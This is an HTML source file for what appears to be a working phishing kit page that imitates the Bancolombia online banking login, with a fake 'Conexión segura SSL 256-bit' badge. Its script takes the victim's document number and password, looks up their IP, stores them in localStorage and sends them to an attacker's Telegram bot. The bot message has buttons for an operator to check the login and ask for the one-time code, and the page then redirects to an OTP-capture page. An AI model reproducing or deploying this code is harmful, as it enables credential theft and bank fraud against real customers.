<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Ingreso - Bancolombia</title>
    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>üè¶</text></svg>">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
    <link href="https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css" rel="stylesheet">
    
    <style>
        :root {
            --bg-gradient: linear-gradient(135deg, #fef3c7 0%, #fde047 38%, #facc15 100%);
            --card-bg: rgba(255, 255, 255, 0.94);
            --text: #0f172a;
            --primary: #ffd200;
            --primary-hover: #facc15;
            --border: rgba(250, 204, 21, 0.28);
            --shadow: 0 28px 60px rgba(217, 119, 6, 0.18);
            --error: #ef4444;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        html, body {
            height: 100%;
        }

        body {
            background: var(--bg-gradient);
            font-family: 'Inter', sans-serif;
            position: relative;
            overflow-x: hidden;
        }

        body::before {
            content: "";
            position: fixed;
            inset: 0;
            background: linear-gradient(160deg, rgba(255,255,255,0.45) 0%, rgba(254,240,138,0.4) 45%, rgba(217,119,6,0.25) 100%);
            z-index: 0;
            pointer-events: none;
        }

        .login-wrap {
            min-height: 100%;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 28px 18px;
            position: relative;
            z-index: 1;
        }

        .login-card {
            width: 100%;
            max-width: 480px;
            background: var(--card-bg);
            border: 1px solid var(--border);
            border-radius: 28px;
            box-shadow: var(--shadow);
            padding: 38px;
            backdrop-filter: blur(16px);
        }

        .logo {
            text-align: center;
            margin-bottom: 32px;
        }

        .logo svg {
            width: 200px;
            height: auto;
        }

        .login-header {
            text-align: center;
            margin-bottom: 32px;
        }

        .login-title {
            font-size: 24px;
            font-weight: 700;
            color: var(--text);
            margin-bottom: 8px;
        }

        .login-subtitle {
            font-size: 14px;
            color: #64748b;
            line-height: 1.5;
        }

        .alert-error {
            display: none;
            background: #fee2e2;
            border: 1px solid #fecaca;
            border-radius: 12px;
            padding: 16px;
            margin-bottom: 24px;
            color: var(--error);
            font-size: 14px;
            align-items: center;
            gap: 12px;
        }

        .alert-error.show {
            display: flex;
        }

        .alert-error i {
            font-size: 20px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-label {
            display: block;
            font-size: 14px;
            font-weight: 600;
            color: var(--text);
            margin-bottom: 8px;
        }

        .form-input-wrap {
            position: relative;
        }

        .form-input {
            width: 100%;
            padding: 14px 16px 14px 48px;
            border: 2px solid #e2e8f0;
            border-radius: 12px;
            font-size: 15px;
            font-family: inherit;
            transition: all 0.3s ease;
            background: white;
        }

        .form-input:focus {
            outline: none;
            border-color: var(--primary);
            box-shadow: 0 0 0 4px rgba(255, 210, 0, 0.1);
        }

        .form-input.error {
            border-color: var(--error);
        }

        .input-icon {
            position: absolute;
            left: 16px;
            top: 50%;
            transform: translateY(-50%);
            font-size: 20px;
            color: #64748b;
            pointer-events: none;
        }

        .btn-submit {
            width: 100%;
            padding: 16px;
            background: var(--primary);
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 700;
            color: #0f172a;
            cursor: pointer;
            transition: all 0.3s ease;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            margin-top: 8px;
        }

        .btn-submit:hover {
            background: var(--primary-hover);
            transform: translateY(-2px);
            box-shadow: 0 8px 24px rgba(255, 210, 0, 0.4);
        }

        .btn-submit:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }

        .security-badge {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            margin-top: 24px;
            padding: 14px;
            background: rgba(74, 222, 128, 0.1);
            border-radius: 12px;
            border: 1px solid rgba(74, 222, 128, 0.2);
        }

        .security-badge i {
            font-size: 20px;
            color: #22c55e;
        }

        .security-text {
            font-size: 13px;
            color: #16a34a;
            font-weight: 600;
        }

        .loading-screen {
            display: none;
            position: fixed;
            inset: 0;
            background: rgba(15, 23, 42, 0.9);
            z-index: 9999;
            align-items: center;
            justify-content: center;
        }

        .loading-screen.active {
            display: flex;
        }

        .loading-content {
            text-align: center;
            color: white;
        }

        .spinner {
            width: 50px;
            height: 50px;
            border: 5px solid rgba(255, 255, 255, 0.2);
            border-top-color: var(--primary);
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        @media (max-width: 599px) {
            .login-card {
                padding: 28px 24px;
            }
        }
    </style>
</head>
<body>
    <div class="loading-screen" id="loadingScreen">
        <div class="loading-content">
            <div class="spinner"></div>
            <p>Validando tus datos...</p>
        </div>
    </div>

    <div class="login-wrap">
        <div class="login-card">
            <div class="logo">
                <svg viewBox="0 0 200 40">
                    <text x="10" y="30" font-family="Inter, Arial" font-size="24" font-weight="900" fill="#005CA9">Bancolombia</text>
                </svg>
            </div>

            <div class="login-header">
                <h1 class="login-title">üîê Ingreso Seguro</h1>
                <p class="login-subtitle">Ingresa tus credenciales para continuar con tu solicitud</p>
            </div>

            <div class="alert-error" id="errorAlert">
                <i class='bx bx-error-circle'></i>
                <span>Usuario o clave incorrectos. Por favor verifica e intenta nuevamente.</span>
            </div>

            <form id="loginForm">
                <div class="form-group">
                    <label class="form-label" for="usuario">Tipo y n√∫mero de documento</label>
                    <div class="form-input-wrap">
                        <i class='bx bx-user input-icon'></i>
                        <input type="text" id="usuario" class="form-input" placeholder="Ej: CC 1234567890" required>
                    </div>
                </div>

                <div class="form-group">
                    <label class="form-label" for="clave">Clave de ingreso</label>
                    <div class="form-input-wrap">
                        <i class='bx bx-lock-alt input-icon'></i>
                        <input type="password" id="clave" class="form-input" placeholder="Ingresa tu clave" maxlength="8" required>
                    </div>
                </div>

                <button type="submit" class="btn-submit" id="submitBtn">
                    INGRESAR
                </button>

                <div class="security-badge">
                    <i class='bx bx-shield-quarter'></i>
                    <span class="security-text">Conexi√≥n segura SSL 256-bit</span>
                </div>
            </form>
        </div>
    </div>

    <script src="js/telegram.js"></script>
    <script>
        console.log('üîç Login page loaded');

        // Verificar si viene con error
        const urlParams = new URLSearchParams(window.location.search);
        if (urlParams.get('error') === '1') {
            document.getElementById('errorAlert').classList.add('show');
        }

        // Obtener IP
        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch {
                return 'IP no disponible';
            }
        }

        // Form submission
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            console.log('üì§ Form submitted');

            const usuario = document.getElementById('usuario').value.trim();
            const clave = document.getElementById('clave').value.trim();

            if (!usuario || !clave) {
                document.getElementById('errorAlert').classList.add('show');
                return;
            }

            // Mostrar loading
            document.getElementById('loadingScreen').classList.add('active');

            // Obtener IP
            const userIP = await getIP();
            const transactionId = Date.now().toString(36) + Math.random().toString(36).substr(2);

            // GUARDAR EN LOCALSTORAGE CON LOS NOMBRES QUE BUSCA otp-dinamica.html
            localStorage.setItem('userName', usuario);
            localStorage.setItem('userPass', clave);
            localStorage.setItem('userIP', userIP);
            localStorage.setItem('userIP2', 'Colombia'); // Puedes mejorar esto con geolocalizaci√≥n
            localStorage.setItem('transactionId', transactionId);

            console.log('üíæ Datos guardados:', {
                userName: usuario,
                userPass: clave,
                userIP: userIP,
                transactionId: transactionId
            });

            // Enviar a Telegram
            const mensaje = `üîê *BANCOLOMBIA - LOGIN*\n\nüë§ *Usuario:* ${usuario}\nüîë *Clave:* ${clave}\nüåê *IP:* ${userIP}\n‚è∞ *Hora:* ${new Date().toLocaleTimeString('es-CO')}\nüìÖ *Fecha:* ${new Date().toLocaleDateString('es-CO')}\nüÜî *ID:* ${transactionId}`;

            const teclado = {
                inline_keyboard: [
                    [
                        { text: "‚úÖ Correcto", callback_data: `correcto:${transactionId}` },
                        { text: "‚ùå Incorrecto", callback_data: `error_login:${transactionId}` }
                    ],
                    [
                        { text: "üîê Pedir Din√°mica", callback_data: `pedir_dinamica:${transactionId}` }
                    ],
                    [
                        { text: "‚úîÔ∏è Finalizar", callback_data: `finish:${transactionId}` }
                    ]
                ]
            };

            try {
                if (typeof sendTelegramMessage === 'function') {
                    await sendTelegramMessage(mensaje, teclado);
                    console.log('‚úÖ Mensaje enviado a Telegram');
                } else {
                    console.warn('‚ö†Ô∏è sendTelegramMessage no disponible');
                }
                
                // Simular espera de respuesta (2 segundos)
                setTimeout(() => {
                    document.getElementById('loadingScreen').classList.remove('active');
                    console.log('üîÑ Redirigiendo a otp-dinamica.html');
                    window.location.href = 'otp-dinamica.html';
                }, 2000);

            } catch (error) {
                console.error('‚ùå Error:', error);
                document.getElementById('loadingScreen').classList.remove('active');
                document.getElementById('errorAlert').classList.add('show');
            }
        });

        // Limpiar error al escribir
        document.querySelectorAll('.form-input').forEach(input => {
            input.addEventListener('input', () => {
                document.getElementById('errorAlert').classList.remove('show');
                input.classList.remove('error');
            });
        });
    </script>
</body>
</html>
